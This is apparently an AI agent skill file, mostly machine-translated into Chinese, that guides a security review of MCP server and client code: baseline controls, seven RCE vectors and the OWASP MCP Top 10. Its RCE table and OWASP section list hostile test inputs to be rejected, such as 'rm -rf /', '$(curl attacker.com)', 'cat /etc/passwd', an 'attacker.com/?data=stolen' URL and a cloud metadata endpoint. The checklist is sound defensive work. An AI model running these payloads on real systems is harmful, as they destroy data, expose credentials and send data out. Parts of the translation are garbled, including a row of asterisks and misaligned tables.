---
name: mcp-implementation-security-review
description: |
  Review the implementation source code of MCP (Model Context Protocol) servers, clients, and tool handlers against a security baseline — authentication, sessions, rate limiting, input-schema validation, official-SDK usage, RCE vectors, and the OWASP MCP Top 10 — producing a report with file/line evidence. Use this skill when:
  - Reviewing an MCP server implementation for security before release
  - Checking a server against the baseline controls (MCP-01 to MCP-05) and the OWASP MCP Top 10
  - Auditing tools for RCE vectors (command/code injection, unsafe deserialization, path traversal, SSTI, dependency hijacking, SSRF)
  - Verifying auth, session, rate-limiting, and input-validation controls on a network-exposed server
  - Reviewing MCP client code that handles untrusted server responses and session IDs
  - Requests like "review this MCP server for security" or "is my MCP server implementation secure?"
---
# MCP实施安全审查

# #过程

###步骤1 -分类目标
-检查**MCP协议版本[2025-03-26]（https://modelcontextprotocol.io/specification/2025-03-26）或更高版本**（当前版本：[2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)）。将旧版本标记为发现，但继续审查。
—判断目标是**服务器**还是**客户端**。
-使用下面的传输参考将传输分类为**网络暴露**或**仅本地**。
—记录传输、协议版本、会话是否存在。

**完成标准：**确定目标类型、协议状态和传输。

###步骤2 -过滤误报
-在打开调查结果之前应用“假阳性过滤器”。
-只有当文档描述了repo自己的服务器行为、部署、传输或认证状态时，才保留文档。
-对于framework/SDK存储库，作用域发现到**默认配置**和**公共API接口**。**完成标准：**剩余的证据是范围内的代码，回购拥有的文档，或公共API行为。

###步骤3 -检查基线控件
—对于**网络暴露的服务器**，检查**MCP-01**到**MCP-05**。
-对于**local/STDIO服务器**，不标记基线控制PASS/FAIL；提供最佳实践说明并继续进行RCE审查。
-对于**客户端**，只审查token/session处理显式可见的客户端代码；除非用户要求进行客户端风险审查，否则不要应用服务器基线。

**完成标准：**每个适用的控件都有一个支持的状态。

###步骤4 -检查RCE矢量
-检查所有7个RCE矢量。
-标记每个矢量**安全**，**危险**，或**N/A**。
-偏好直接证据而非推论；下面的RCE Vectors表列举了要查找的模式。

**完成标准：**每个相关工具都有一个RCE结果或明确的N/A.###步骤5 -检查OWASP MCP前10名
-评估以下所有10个OWASP风险。
-如果步骤3中的控制已经完全覆盖了OWASP风险，则引用该结果而不是重新检查。
—对于local/STDIO服务器，将依赖网络的OWASP风险（MCP07、MCP09）标记为N/A.-标记每个风险通过、失败或需要调查。

**完成标准：**所有10个OWASP风险的结果均有可观察证据支持或参考步骤3。

###步骤6 -报告
—使用下面的“遵从性输出格式”。
-在每个理由中包括file/line引用。
-将代码发现与手动跟踪分开。
-如果证据不完整，使用“需要调查”并命名丢失的神器。

**完成标准：**报告包括控件、RCE、可选OWASP和操作。

# #参考决策规则
- **网络暴露的服务器：**应用**所有5个控件**，然后运行RCE和请求的OWASP检查。
- **Local/STDIO服务器：** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** 5个控制；仍然运行RCE，因为工具输入可以在本地执行。
- **客户端：**审查接收到的令牌处理和拒绝信任服务器提供的会话id；除非被要求，否则不要强制服务器控制。
- **反向代理或容器暴露：**如果流量可以通过网络到达服务器，将其视为**网络暴露**，即使内部绑定是localhost。
- **证据不明确：**不要猜测。标记**需要调查**并说明必须手工验证的内容。
- **不明确的认证覆盖范围：**认证中间件存在，但不清楚它是否覆盖MCP端点→标记**需要调查**。
- **不确定的传输：**如果不能从代码建立传输，标记为手动审查并做**not** assume STDIO -默认为STDIO会错误地跳过服务器控件。运输分类

**网络暴露（强制所有控制）：**

|模式|传输||---|---|
|`transport="http"`或`transport="sse"`|HTTP/SSE|
|`StreamableHttpServerTransport`| HTTP (TS/JS) |
|`SSEServerTransport`| SSE (TS/JS) |
|`WithHttpTransport()`| HTTP (c#) |
|`host="0.0.0.0"`|所有接口绑定|
|通过MCP路由快速表示`.listen(port)`| HTTP（默认`0.0.0.0`） |
|`EXPOSE`在Dockerfile + MCP服务器|网络暴露|

**Local-only（仅限最佳实践）：**

|模式|传输||---|---|
|`StdioServerTransport`| STDIO (TS/JS) |
|`WithStdioServerTransport()`| STDIO (c#
|`transport="stdio"`| STDIO |
|`mcp.run()`不带参数（Python FastMCP） | STDIO默认|
|`.vscode/mcp.json`带`command`键，没有URL | STDIO子进程|

**主机绑定：**

|绑定|实际暴露||---|---|
|`host="0.0.0.0"`|🔴网络暴露|
|`host="127.0.0.1"`或`localhost`|🟢Local-only |
|无显式主机（Express/Node） |🔴默认为`0.0.0.0`|
|无显式主机（Python FastMCP） |🟡依赖于传输-验证|
| Docker`ports: "8000:8000"`|🔴即使进程在容器|中绑定`127.0.0.1`，也会暴露网络

假阳性过滤器

| FP模式|如何检测||---|---|
|`.github/skills/`templates |路径中包含`.github/skills/`- skill模板，而不是服务器代码|
|厂商SDK / OSS拷贝|文件定义`class FastMCP`，`class McpServer`，或者路径在`node_modules/`，`vendor/`|
| MCP客户端配置|`.vscode/mcp.json`与`inputs`/`servers`，但没有服务器代码|
|文档/教程|`.md`，`.rst`与代码栅栏无关的回购自己的服务器|
|仅用于出站授权的库|`DefaultAzureCredential`、服务帐户JSON或类似库|

描述repo自己的服务器行为、传输、认证状态或部署的文档**不是**误报。

##控制参考

### MCP-01 -身份隔离
**范围：**远程MCP服务器* * * *
-使用可信身份提供者对每个入站请求进行身份验证，并在服务器边界强制授权；不要从会话id、先前请求或网络位置推断认证。
-使用**唯一的服务器特定的应用程序标识**和audience/resource标识符；出站调用在需要时使用独立作用域的服务凭据或代表流，而不是入站令牌。
—未经身份验证的发现端点只允许用于元数据的OAuth/MCP引导：`/.well-known/oauth-protected-resource`，`/.well-known/oauth-authorization-server`,`/.well-known/openid-configuration`。**检查什么**
-令牌验证和授权中间件在每个MCP路由上运行；授权区分工具调用、只读和管理操作（如果存在）。
-身份配置显示专用的application/client/resourceID和受众；出站客户机获取自己的令牌，并且从不复制入站`Authorization`。
—发现端点只返回元数据，不能执行工具或暴露受保护的数据。

**关键缺陷：**共享的应用程序身份或转发的调用令牌破坏身份隔离并创建混淆的代理路径。

MCP-02 -会话
**范围：**远程MCP服务器支持会话* * * *适用性
→标记**N/A**（仍然需要按请求授权；参见MCP-01）。
-会话管理的transport/SDK（例如，流HTTP`Mcp-Session-Id`），但generation/binding不可见的源→标记**需要调查**，而不是失败。
-在代码中出现的会话标识符→分数**PASS/FAIL**针对以下条件。

* * * *
-验证和授权**每一个**请求；会话状态永远不能替代令牌验证。
会话id是不透明的correlation/continuity令牌；它们不授予特权、编码授权或绕过验证。
会话id是cspring生成的，不可预测的，绑定到一个经过验证的上下文，并且永远不会嵌入到url中。**检查什么**
-中间件对每个请求验证令牌，而不仅仅是在会话开始时。
-授权逻辑从不单独信任会话ID；会话ID的丢失或重用不能授予访问权限。
—会话创建使用随机id （GUIDv4/CSPRNG可接受，不支持顺序id和时间id）。

**关键缺陷：**将会话ID作为承载凭证将关联令牌转换为身份验证。

### MCP-03 -速率限制
**经营范围：** MCP服务器及工具

* * * *
-对工具发现和工具调用实施速率限制和滥用保护。
-在MCP服务器运行时实施限制**，而不仅仅是在网关；根据已验证的身份和存在会话的会话进行分区。
-对具有突变能力和高成本的工具实施更严格的限制；当超出限制时，使用**HTTP 429**和**Retry-After**关闭失败，并且不执行该工具。**检查什么**
-速率限制中间件或等效存在于服务器代码中的发现和调用端点上，而不仅仅是在入口或代理配置中。
-限制由身份和会话控制，write/high-cost操作预算更紧。
-超过的请求在后台操作之前停止，并返回429和Retry-After。

**启动阈值**（根据实际负载、下游限制和成本调整）：

|工具类型|按身份|按会话| Notes ||---|---|---|---|
|只读/上市|100/min|200/min|下行接口敏感|时设置为低值
|突变/写入|10/min|20/min|更严格的状态更改操作|
|高成本计算|5/min|10/min|成本加权；看云花b|
|工具发现|30/min|60/min|防止枚举滥用|

**关键陷阱：**网关仅节流或一个扁平桶叶旁路和保护不足昂贵的工具。

MCP-04 -模式验证
**范围：** MCP服务器暴露工具与结构化参数

* * * *
-在执行**之前，根据显式模式**验证**所有**工具参数**。
—模式定义类型、必填字段、枚举和边界，默认情况下拒绝未指定的属性（`additionalProperties: false`或同等值）。
-验证在每次调用时运行服务器端；无效输入失败，并以400/MCP错误关闭，没有后端操作。**检查什么**
-每个工具描述符都有一个覆盖类型、必填字段、枚举、边界和属性限制的模式。
-验证发生在每次调用的服务器边界，而不仅仅是在客户端、网关或下游服务中。
—否定测试拒绝错误的输入、额外的属性和边界违反。

**关键陷阱：**允许额外的属性或仅客户端验证创建隐藏的攻击面和范围蠕变。

### MCP-05 - sdk优先
**范围：**远程MCP服务器* * * *
-根据您的服务器的语言在官方MCP SDK上构建远程MCP服务器；
**第1层（完全支持）：** TypeScript (modelcontextprotocol/typescript-sdk), Python (modelcontextprotocol/python-sdk), c# /。NET (modelcontextprotocol/csharp-sdk), Go （modelcontextprotocol/go-sdk）
**层2/3（开发）：** Java (modelcontextprotocol/java-sdk), Kotlin (modelcontextprotocol/kotlin-sdk), Rust (modelcontextprotocol/rust-sdk), Swift (modelcontextprotocol/swift-sdk), PHP (modelcontextprotocol/php-sdk), Ruby （modelcontextprotocol/ruby-sdk）
-如果没有使用官方SDK，请将MCP-05标记为NEEDS INVESTIGATION。
-保持SDK的最新和补丁，并验证哪些控制是自动的，哪些是手动的。

**检查什么**
-依赖项引用官方的MCP SDK，而不是手工制作的HTTP/SSE堆栈。
—如果不使用SDK， repo包含auth/authz、会话、速率限制和模式验证的直接证据。
-依赖绑定和更新卫生显示SDK被维护。**关键缺陷：**手动滚动的服务器通常会错过一个“小”原语——每个请求的授权、节流或验证——并且差距会进一步扩大。

RCE向量

|矢量|危险代码|安全备选|测试有效载荷| CWE ||---|---|---|---|---|
|命令注入|`exec("convert " + args.filename)`，`os.system(f"process {user_input}")`,`Process.Start("cmd", "/c " + toolArg)`|`execFile("convert", [args.filename])`,`subprocess.run(["process", user_input], shell=False)`|`; rm -rf /`,`$(curl attacker.com)`，`| net user`必须拒绝或按字面处理| CWE-78 |
|动态代码评估|`eval(args.expression)`，`exec(tool_output)`，`new Function(args.code)()`|沙盒解析器，基于ast的评估，或预定义的allowlist |`__import__('os').system('whoami')`，`require('child_process').exec('id')`必须被拒绝| CWE-94， CWE-95 |
|不安全反序列化|`pickle.loads(user_data)`、`yaml.load(input, Loader=yaml.UnsafeLoader)`、`BinaryFormatter.Deserialize(stream)`|`yaml.safe_load()`、`JSON.parse()`加模式验证；避免不可信输入的二进制格式|必须拒绝精心制作的序列化有效负载或安全处理| CWE-502 |
|路径遍历|`fs.readFile(args.path)`未经验证，`open(user_path, 'w')`|在read/write/execute|`../../../../etc/passwd`，`C:\Windows\System32\config\SAM`，`..\..\..\.env`必须被拒绝| cwe22 |
| SSTI |`Template(user_input).render()`，`Handlebars.compile(args.template)({data})`|绝不使用用户输入作为模板源；使用预定义模板，参数只有|`{{7*7}}`，`${7*7}`，`<%= 7*7 %>`不能渲染`49`| CWE-1336 |
|未固定的深度，如`"lodash": "^4.0.0"`；| Pin精确的版本，用完整的哈希保存锁文件，使用trusted/scoped注册表，验证可用的签名|`npm audit`，`pip audit`，或`dotnet list package --vulnerable`；审查cve和可疑包| CWE-829 |
| SSRF |`requests.get(user_param)`,`fetch(user_input)`，`HttpClient.GetAsync(user_input)`|允许schemes/domains，阻断RFC1918和link-local目标，发送|前验证url，`http://169.254.169.254/latest/meta-data/`,`http://localhost:8080/admin`，`http://attacker.com/?data=stolen`必须被拒绝| cwe918 |## OWASP MCP排名前十

**MCP01:2025 -令牌管理不善和秘密暴露**
测试：搜索硬编码的秘密和令牌记录；验证来自嫉妒者或秘密管理器的秘密；验证short-lived/rotated令牌。
Pass：没有硬编码的秘密，敏感字段被编辑，short-lived/rotated令牌。失败：硬编码的秘密、令牌记录或没有轮换的长期令牌。

**MCP02:2025 -权限升级通过范围蠕变**
测试：复习scopes/roles；确认最小权限和每个请求授权；除非有正当理由，否则拒绝通配符管理范围；检查运行时功能扩展。
Pass：最少权限范围，每个请求授权，没有运行时功能扩展。失败：范围广、仅一次授权或自升级工具。**MCP03:2025 -工具中毒**
测试：检查工具定义是否是静态的和服务器控制的，工具是否可以更改元数据，输出是否包含llm可解析的指令。
传递：静态服务器控制的定义和纯数据输出。失败：带有嵌入式指令的外部元数据源或输出。

**MCP04:2025 -供应链攻击和依赖关系篡改**
测试：检查锁定文件、确切的固定、可疑的`postinstall`脚本、依赖项审计结果和受信任的注册表。
通过：固定深度，提交的锁文件，没有已知的漏洞，没有可疑的安装后脚本。失败：未固定的深度、没有锁定文件、未打补丁的cve或不受信任的注册表。** mcp5:2025 -命令注入和执行**
测试：搜索shell执行api和字符串构建命令；跟踪工具输入是否到达shell执行；测试`; ls`，`$(whoami)`,`| cat /etc/passwd`。
通过：不允许从不可信的输入执行shell，或者只允许参数化的执行。失败：用户输入达到shell命令，`shell=True`格式的字符串，或不安全的连接。

**MCP06:2025 -通过上下文有效载荷提示注入**
Test：检查工具输出是否回LLM，外部内容是否为sanitized/truncated/sandboxed，链接的工具调用是否被保护；测试对抗性指令输出。
通过：工具输出为数据，不可信内容为sanitized/truncated/sandboxed，链接有护栏。失败：原始的外部内容返回到模型，并且没有链接限制。**MCP07:2025 -认证和授权不足**
测试：发送不带身份验证的请求，使用expired/invalid令牌；验证每个工具的授权；确认认证是在服务器中强制执行的，而不仅仅是在网关。
通过：所有端点都需要有效的身份验证，存在每个工具的授权，并且执行发生在服务器端。失败：任何未经身份验证的访问，缺少每个工具的身份验证，或仅对网关实施。

** mcp8:2025 -缺乏审计和遥测**
测试：调用工具并确认日志捕获调用者标识、工具名称和时间戳；触发错误并确认有用的上下文；验证集中式日志记录和警报。
通过：使用身份记录工具调用，集中记录日志，并存在警报。失败：缺少日志、没有调用者标识、只记录本地日志或没有警报。**MCP09:2025 -影子MCP服务器**
测试：验证服务器是否存在于服务目录中；检查未记录的MCP端点或暴露的非标准端口；检查dev/staging隔离；验证所有者并审查跟踪。
通行证：所有的服务器都被编目，适当地隔离，并拥有。失败：未记录的服务器，dev/test暴露在生产网络中，或者没有所有权。

**MCP10:2025 -上下文注入和过度共享**
测试：检查工具响应数据最小化；当只需要子集时，检查PII或完整对象；验证上下文隔离。
Pass：返回最小数据，敏感字段为masked/excluded，并且上下文是隔离的。失败：不必要地返回完整对象，暴露PII，或者在用户之间共享上下文。

遵从输出格式

在下面的每个汇总表中，**Justification**单元格必须为状态引用特定的file/line证据。###控制摘要

|控制|名称|状态|正当化||---|---|---|---|
| MCP-01 |身份认证隔离|✅PASS /❌FAIL /⚠️需要调查/N/A|…|
| MCP-02 |安全会话管理|…|…|
| MCP-03 |限速和滥用保护|…|…|
| MCP-04 |输入模式验证|…|…|
| MCP-05 |生产SDK使用|…|

只有当代码明显满足控制时才使用**PASS**。当冲突是可观察到的时候，使用**FAIL**。当遵从性依赖于部署配置、身份提供者状态、日志或其他在源代码中不可见的证据时，使用**NEEDS INVESTIGATION**。

RCE总结

|向量|状态|正当化||---|---|---|
|命令注入| SAFE / AT RISK /N/A|…|
动态代码求值|…|…|
|不安全反序列化|…|…|
|路径遍历|…|…|
| ssti |…|…|
依赖劫持|…|…|
| SSRF |…|…|

OWASP概要

|风险|状态|理由||---|---|---|
| mcp:2025 |✅通过/❌失败/⚠️需要调查|…|
| mcp02 . 2025 |…|…|
| McP03:2025 |…|…|
|…|…|
| McP05:2025 |…|…|
|…|…|
| McP07:2025 |…|…|
|…|…|
|…|…|
| mcp:2025 |…|…|

手动跟进
列出每个不能从源代码完全解决的检查，指定需要什么工件或访问来验证它。

##异常处理
**确定未满足的控制、准确的偏差、剩余风险和任何补偿控制。
- **获得明确的批准：**通过security/release批准路由异常，并带有所有者和有效期或审查日期。
**跟踪和重新评估：**记录已批准的例外情况和合规结果，并在到期或服务器、工具、流量配置文件或暴露变化时重新访问它。